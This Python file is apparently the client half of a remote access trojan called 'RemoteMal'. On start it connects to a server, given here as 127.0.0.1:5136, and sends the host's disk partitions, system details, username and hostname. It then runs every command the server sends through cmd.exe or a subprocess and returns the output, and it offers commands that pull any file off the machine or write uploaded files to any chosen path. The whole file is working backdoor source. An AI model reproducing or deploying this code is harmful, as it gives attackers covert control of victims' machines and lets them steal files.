import socket
import subprocess
import os
import sys
import platform
import time
import psutil
import getpass
import shlex
import struct
class RemoteClient(object):

    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024,TimeOut=10,file_transfer_buffer=1024):
       self.Ip=Ip                                       #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId                               #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)                         #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet                             #Character Set For Encoding And Decoding
       self.Buffering=Buffering                         #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
       self.TimeOut=TimeOut                             #TimeOut which is the Maximum Exexcution Time For Command Execution.
       self.RecvBuffer = list()                         #Buffer used to handle the combined data
       self.file_transfer_buffer = file_transfer_buffer #Buffer used to transfer binary files

    def Connect(self):
        #Connect To The Server:
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.client_socket.connect(self.Address)

    def send_size(self, size):
        # Pack the size as a big-endian unsigned long long (8 bytes)
        packed_size = struct.pack('>Q', size)
        
        # Pad with zeros if less than 8 bytes
        padded_size = packed_size.ljust(8, b'\x00')  # Ensure it’s exactly 8 bytes
        
        # Send the padded size
        self.client_socket.sendall(padded_size)


    def recv_size(self):
        # Receive exactly 8 bytes
        size_bytes = self.client_socket.recv(8)
        
        # Unpack the 8-byte buffer to get the size
        size = struct.unpack('>Q', size_bytes)[0]

        return size

    def send(self, data):
        # Append a null character to the data to indicate the end of the message
        null_added_data = self.AppendNull(data)
        
        # Send the data in chunks to avoid exceeding the buffer size
        for i in range(0, len(null_added_data), self.Buffering):
            # Extract a chunk of data based on the specified buffering size
            chunk = null_added_data[i:i+self.Buffering]
            
            # Send the encoded chunk of data through the client socket
            self.client_socket.send(chunk.encode(self.CharSet)) 

        return None  # Return None to indicate the function has completed


    def recv(self):
        data = ""  # Initialize an empty string to store received data
        flag = True  # Flag to control the reception loop

        # Check if there's already data to dequeue
        dequeue = self.DequeueHandler()
        if not dequeue:
            while flag:
                # Receive a chunk of data from the client socket and decode it using the specified character set
                chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)

                if len(chunk) >= 1:
                    # Check if the last character of the chunk is a null character
                    if chunk[-1] == '\0':
                        flag = False  # If it is, set flag to False to exit the loop

                # Append the received chunk to the data string
                data += chunk
            
            # Split the data by null characters and enqueue it for further processing
            return self.EnqueueHandler(data.split('\0')) 
        return dequeue  # Return the dequeued data if available



    def bin_send(self, bin_data):
        # Iterate over the binary data in chunks defined by file_transfer_buffer size
        for i in range(0, len(bin_data), self.file_transfer_buffer):
            # Extract a chunk of binary data
            chunk = bin_data[i:i + self.file_transfer_buffer]
            # Send the chunk to the client socket
            self.client_socket.send(chunk) 
        return None  # Indicate that the function has completed


    def bin_recv(self):
        # Receive the total file size from the sender
        file_size = self.recv_size()
        # Calculate the number of chunks needed to receive the entire file
        num_of_chunks = (file_size + self.file_transfer_buffer - 1) // self.file_transfer_buffer

        # Iterate over the number of chunks to receive the file in parts
        for _ in range(num_of_chunks):
            # Receive a chunk of data from the client socket
            chunk = self.client_socket.recv(self.file_transfer_buffer)
            # Yield the received chunk to the caller for processing
            yield chunk


    def EnqueueHandler(self, next_data):
        # Iterate through the next_data to add it to the receive buffer
        for data in next_data:
            # Skip empty data
            if not data:
                continue
            # Append the valid data to the receive buffer
            self.RecvBuffer.append(data)
        # Return the result of the DequeueHandler to process the buffer
        return self.DequeueHandler()


    def DequeueHandler(self):
        # Check if there is any data in the receive buffer
        if len(self.RecvBuffer) != 0:
            # Remove the first item from the buffer, process it, and return
            return self.remove_bom(self.RecvBuffer.pop(0)).replace('\\x00', '\x00')
        return None  # Return None if the buffer is empty


    def remove_bom(self, data):
        try:
            # Remove the BOM character if it exists in the data
            return data.replace('\ufeff', '')
        except:
            # Return the original data if an exception occurs
            return data


    def DownloadTextFile(self, file_path):
        # Check if the specified file exists
        if os.path.exists(file_path):
            self.send("True")  # Notify the client that the file exists
            is_dld_path_exist = self.recv()  # Receive confirmation of the download path existence
            
            # If the download path exists
            if is_dld_path_exist == "True":
                # Open the file in read mode
                with open(file_path, mode='r') as file:
                    file_content = file.read()  # Read the entire content of the file
                    self.send(file_content)  # Send the file content to the client
            else:
                return None  # If the download path does not exist, do nothing
        else:
            self.send("False")  # Notify the client that the file does not exist



    def DownloadedBinaryFile(self, file_path):
        # Check if the specified file exists
        if os.path.exists(file_path):
            self.send("True")  # Notify the client that the file exists
            is_dld_path_exist = self.recv()  # Receive confirmation of the download path existence
            
            # If the download path exists
            if is_dld_path_exist == "True":
                try:
                    # Open the file in binary read mode with specified buffering
                    with open(file_path, mode='rb', buffering=self.file_transfer_buffer) as file:
                        file_size = os.path.getsize(file_path)  # Get the size of the file
                        self.send_size(file_size)  # Send the file size to the client
                        
                        # Continuously read and send the file in chunks
                        while True:
                            file_chunk = file.read(self.file_transfer_buffer)  # Read a chunk of the file
                            
                            if not file_chunk:  # If no more data is read, exit the loop
                                break
                            
                            self.bin_send(file_chunk)  # Send the chunk to the client

                except PermissionError as perror:
                    # Handle permission errors by notifying the client and sending an error byte
                    self.send_size(1)  # Indicate an error occurred
                    self.bin_send(b'\x00')  # Send error indicator

                except OSError as oserror:
                    # Handle other OS-related errors
                    self.send_size(1)  # Indicate an error occurred
                    self.bin_send(b'\\x00')  # Send error indicator
                    
            else:
                return None  # If the download path does not exist, do nothing
        else:
            self.send("False")  # Notify the client that the file does not exist


    def UploadTextFile(self, file_path):
        # Receive confirmation if the file exists on the client side
        is_file_exist = self.recv()  
        if is_file_exist == "True":
            upld_path = self.recv()  # Receive the upload path from the client
            file_name = self.recv()  # Receive the file name from the client
            
            # Check if the specified upload path exists
            if os.path.exists(upld_path):
                self.send("True")  # Notify the client that the upload path exists
                
                # Open the file in write mode to save the uploaded content
                with open(upld_path + '/' + file_name, mode='w') as file:
                    file_content = self.recv()  # Receive the content of the file from the client
                    
                    if not file_content:  # If no content is received, write an empty file
                        file.write('')
                    else:
                        file.write(file_content)  # Write the received content to the file
                
                self.send("True")  # Notify the client that the upload was successful
            else:
                self.send("False")  # Notify the client that the upload path does not exist
        else:
            return None  # If the file does not exist, do nothing


    def UploadBinaryFile(self, file_path):
        # Receive confirmation if the file exists on the client side
        is_file_exist = self.recv()  
        if is_file_exist == "True":
            upld_path = self.recv()  # Receive the upload path from the client
            file_name = self.recv()  # Receive the file name from the client
            
            # Check if the specified upload path exists
            if os.path.exists(upld_path):
                self.send("True")  # Notify the client that the upload path exists
                
                try:
                    # Open the file in binary write mode to save the uploaded content
                    with open(upld_path + '/' + file_name, mode='wb', buffering=self.file_transfer_buffer) as file:
                        file_content = self.bin_recv()  # Receive the binary content of the file
                        
                        for chunk in file_content:
                            # Check for specific error conditions in the received chunks
                            if chunk == b'\x00':
                                raise PermissionError()  # Raise an error for permission issues
                            elif chunk == b'\\x00':
                                raise OSError()  # Raise an error for an unspecified error condition
                            else:
                                file.write(chunk)  # Write the received chunk to the file

                except PermissionError as Perror:
                    return None  # Handle permission error (no action taken)
                except OSError as oserror:
                    return None  # Handle OS error (no action taken)
                else:
                    self.send("True")  # Notify the client that the upload was successful

            else:
                self.send("False")  # Notify the client that the upload path does not exist
        else:
            return None  # If the file does not exist, do nothing



    def GetBuffer(self):
        #Recieve the Buffer From Server Side
        return self.recv() 

    def SetBuffer(self):
        #Change The Value Of Buffering
        self.Buffering=int(self.GetBuffer())

    def LocationOfFile(self):
        #Send The  Location of the <client>  File Downloaded Path
        self.path=os.getcwd()
        self.send(self.path)
        return None

    def AppendNull(self, data):
        # Replace all null characters with the escape sequence '\x00'
        data = data.replace('\x00', '\\x00')  
        
        # Append a null character at the end of the modified data
        return data + '\0'  


    def Partitions(self):
        #Get the Partitions of the system
        partitions,mountpoints="",""
        for partition in psutil.disk_partitions():
                partitions+=partition.device
                mountpoints+=partition.mountpoint
        self.send(partitions)
        self.send(mountpoints)

    def PartitionsInfo(self):
        #Get the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        partitions_info=""
        for partition in psutil.disk_partitions():
            try:
                Memory_size=psutil.disk_usage(partition.mountpoint).total/(1024*1024*1024)
            except OSError:
                Memory_size=-1
            partitions_info+=f"{partition.device}\t{partition.mountpoint}\t{partition.opts}\t{int(Memory_size)}"+"\n"
        self.send(partitions_info)

    def SysPlatform(self):
        #Retrieve the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=sys.platform
        self.send(self.platform)

    def SysInfo(self):
        #Retrieve the System information of the client
        Info=f"""System<:>{platform.system()}<,>Release<:>{platform.release()}<,>Version<:>{platform.version()}<,>Architecture<:>{platform.machine()}\nProcessor<:>{platform.processor()}<,>Physical Cores<:>{os.cpu_count()}<,>Total Cores<:>{os.cpu_count()}"""
        self.send(Info)

    def GetUserAndDevice(self):
        #Get the User name and Device of the Current User
        self.send(getpass.getuser())
        self.send(platform.node())


    def VerifyPath(self):
        #check whether the path is correct or not
        path=self.recv()
        try:
            os.chdir(path)
            self.path=path 
            self.send("TRUE")
        except Exception as e:
            self.send("FALSE")
    
    def close(self)->None:
        #close the socket connection.
        self.client_socket.close()
        sys.exit(0)         #Exit the program with success code 0
        return None


    def _exe_cmd(self,cmd,input="\n"):

        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(["cmd.exe","/c"]+cmd_list,universal_newlines=True,cwd=self.path,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input,timeout=self.TimeOut)

            #Sends the flag for the data is stdout or stderr
            self.send(stdout) if (stdout) else self.send("Yes") if (stderr) else self.send("No")
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")

        except Exception as error:
            self.send("Yes")
            self.send(str(error))

    def _exe_Terminal(self,cmd,input="\n"):

        #split command based on shell input
        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(cmd_list,universal_newlines=True,cwd=self.path,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input,timeout=self.TimeOut)

            #Sends the flag for the data is stdout or stderr
            self.send(stdout) if (stdout) else self.send("Yes") if (stderr) else self.send("No")
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command   
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")


        except Exception as error:
            self.send("Yes")
            self.send(error.__str__())

    

    def main(self):
        #Entry Point of the Program

        if(self.platform=="win32"):
            
            #The code Block windows command execution
            while(True):

                
                cmd=self.recv() #Recieve the command to be executed

                if(not cmd):
                    continue
                
                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                # Handle remote file download commands
                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Get the option (-t or -b)
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\", "/")  # Extract file path from command
                    if(option == '-t'):
                        self.DownloadTextFile(file_path)  # Call method to download text file
                    elif(option == '-b'):
                        self.DownloadedBinaryFile(file_path)  # Call method to download binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")  # Print error for invalid option

                # Handle remote file upload commands
                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Get the option (-t or -b)
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\", "/")  # Extract file path from command
                    if(option == '-t'):
                        self.UploadTextFile(file_path)  # Call method to upload text file
                    elif(option == '-b'):
                        self.UploadBinaryFile(file_path)  # Call method to upload binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")  # Print error for invalid option


                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        stdin=self.recv()+"\n"
                        self._exe_cmd(cmd,stdin) # Execute the command with input
                    else:
                        self._exe_cmd(cmd) #Execute the command without input


        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block linux or Mac command execution
            while(True):

                
                cmd=self.recv() #Recieve the command to be executed

                if(not cmd):
                    continue

                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                # Handle remote file download commands
                elif cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3:
                    option = cmd.split()[1]  # Get the option (-t for text, -b for binary)
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\", "/")  # Extract file path from command
                    if option == '-t':
                        self.DownloadTextFile(file_path)  # Call method to download text file
                    elif option == '-b':
                        self.DownloadedBinaryFile(file_path)  # Call method to download binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")  # Print error for invalid option

                # Handle remote file upload commands
                elif cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3:
                    option = cmd.split()[1]  # Get the option (-t for text, -b for binary)
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\", "/")  # Extract file path from command
                    if option == '-t':
                        self.UploadTextFile(file_path)  # Call method to upload text file
                    elif option == '-b':
                        self.UploadBinaryFile(file_path)  # Call method to upload binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")  # Print error for invalid option


                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        stdin=self.recv()+"\n"
                        self._exe_Terminal(cmd,stdin) # Execute the command with input
                    else:
                        self._exe_Terminal(cmd) #Execute the command without input
                
        else:
            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            self.close() #Close the connection between client and server







        
if __name__=="__main__":
    r=RemoteClient("127.0.0.1",5136)
    r.Connect()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.SysInfo()
    r.PartitionsInfo()
    r.GetUserAndDevice()
    r.main()
#######################################################################################################################################
